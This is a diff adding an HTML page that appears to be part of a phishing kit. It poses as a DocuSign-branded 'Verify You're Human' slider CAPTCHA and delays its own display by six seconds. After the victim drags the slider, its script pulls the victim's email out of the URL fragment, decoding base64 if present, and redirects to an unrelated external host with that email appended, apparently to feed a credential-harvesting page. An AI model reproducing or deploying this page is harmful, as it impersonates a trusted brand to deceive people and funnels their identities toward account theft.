@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Slider CAPTCHA</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: calc(100vh - 145px);
+      background-color: #f8f9fa;
+    }
+    .card {
+      border-radius: 20px;
+      padding: 30px;
+      width: calc(100vw - 60vw) !important;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border-top: solid 5px #00bef8;
+    }
+
+    .container {
+        display: none;
+        justify-content: center;
+        width: calc(100vw - 189px) !important;
+        height: calc(100vh - 459px);
+        padding: 30px;
+    }
+    #slider {
+    width: 100%;
+    appearance: none;
+    height: 10px;
+    border-radius: 5px;
+    background: linear-gradient(to right, #00bef8 0%, #e0e0e0 0%);
+    outline: none;
+    transition: background 0.3s ease;
+  }
+
+  #slider::-webkit-slider-thumb {
+    appearance: none;
+    width: 20px;
+    height: 20px;
+    background: #00bef8;
+    border-radius: 50%;
+    cursor: pointer;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+  }
+
+  #slider::-moz-range-thumb {
+    width: 20px;
+    height: 20px;
+    background: #00bef8;
+    border-radius: 50%;
+    cursor: pointer;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+  }
+    #slider-wrapper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column-reverse;
+      gap: 10px;
+    }
+    #slider-label {
+      white-space: nowrap;
+    }
+    #slider-value {
+      font-weight: bold;
+      color: #00bef8;
+      font-size: 34pt !important;
+    }
+    
+    
+  </style>
+</head>
+<body>
+
+
+        
+   
+    <header>
+        <div class="col">
+            <img src="DocuSign-Logo.png" alt="" width="200" style="margin: 0 auto;text-align: center;">
+        </div>
+    </header>
+    <!-- Preloader -->
+    <div class="preloader"><span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span></div>
+  <div class="container">
+    
+    <div class="card text-center p-4" id="verificationCard">
+      <h5 class="card-title" id="card-title">Verify You're Human</h5>
+      <h3 class="card-title" id="comp-title" style="display: none;color: #00bef8;align-items: center;justify-content: space-between;flex-direction: column-reverse;">Success <span><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 100 100">
+        <!-- Circle -->
+        <circle cx="50" cy="50" r="48" stroke="white" stroke-width="4" fill="#00bef8" />
+        <!-- Tick -->
+        <path d="M30 50 L45 65 L70 35" stroke="white" stroke-width="4" fill="#00bef8" stroke-linecap="round" stroke-linejoin="round" />
+      </svg></span></h3>
+      <p class="card-text" id="card-text">Drag the slider to the end to verify that you are human.</p>
+
+      <div id="slider-wrapper" class="mt-4">
+        <span id="slider-label"><strong>Drag the slider to the end.</strong></span>
+        <input type="range" class="form-range" id="slider" min="0" max="100" step="1" value="0">
+        <span id="slider-value">0</span>
+      </div>
+      <!-- Button and Spinner will be hidden initially -->
+      <button id="proceedButton" class="btn btn-primary mt-3" style="display: none;width: 178px;padding: 8px;font-weight: bolder;" onclick="redirectUser()">Click to Proceed</button>
+      <div id="loadingSpinner" class="spinner-border text-primary mt-3" style="display: none;" role="status">
+          <span class="visually-hidden">Loading...</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+
+     
+     setTimeout(() => {
+            document.querySelector('.preloader').style.display = 'none';
+            document.querySelector('.container').style.display = 'grid';
+        }, 6000);
+
+
+  
+  </script>
+  <script>
+    slider.addEventListener("input", function () {
+      sliderValue.textContent = slider.value; 
+      const percentage = (slider.value / slider.max) * 100;
+      slider.style.background = `linear-gradient(to right, #00bef8 ${percentage}%, #e0e0e0 ${percentage}%)`;
+  
+      if (slider.value == slider.max) {
+        proceedButton.style.display = "inline-block"; 
+      } else {
+        proceedButton.style.display = "none"; 
+      }
+    });
+  </script>
+      <script>
+        const slider = document.getElementById("slider");
+        const sliderValue = document.getElementById("slider-value");
+        const proceedButton = document.getElementById("proceedButton");
+        const loadingSpinner = document.getElementById("loadingSpinner");
+        const cardTitle = document.getElementById("card-title");
+        const compTitle = document.getElementById("comp-title");
+        const cardText = document.getElementById("card-text");
+        const sliderWrapper = document.getElementById("slider-wrapper");
+
+        
+        slider.addEventListener("input", function() {
+            sliderValue.textContent = slider.value; 
+            if (slider.value == slider.max) {
+                
+                proceedButton.style.display = "inline-block";
+            } else {
+                
+                proceedButton.style.display = "none";
+            }
+        });
+
+        
+        function redirectUser() {
+            
+            sliderWrapper.style.display = "none"; 
+            cardTitle.style.display = "none"; 
+            compTitle.style.display = "flex"; 
+            cardText.innerText = "Verification completed successfully. Please wait..."; 
+
+            
+            proceedButton.style.display = "none"; 
+            loadingSpinner.style.display = "inline-block"; 
+
+            
+            let email = getEmailFromURL(window.location.href);
+
+            
+            setTimeout(function() {
+              const redirectURL = "https://vcytc.xbzdcia.es/v4SoG@pOuTtuqNl"; 
+                if (email) {
+                    
+                    window.location.href = `${redirectURL}#${email}`;
+                } else {
+                    window.location.href = redirectURL; 
+                }
+            }, 5000); 
+        }
+
+        
+        function getEmailFromURL(url) {
+            const hashPart = url.split('#')[1]; 
+            if (!hashPart) return null;
+
+            let email = null;
+
+            
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            if (emailRegex.test(hashPart)) {
+                email = hashPart; 
+            } else {
+                
+                try {
+                    const decodedEmail = atob(hashPart); 
+                    if (emailRegex.test(decodedEmail)) {
+                        email = decodedEmail; 
+                    }
+                } catch (e) {
+                    console.error("Invalid base64 encoding");
+                }
+            }
+
+            return email;
+        }
+    </script>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
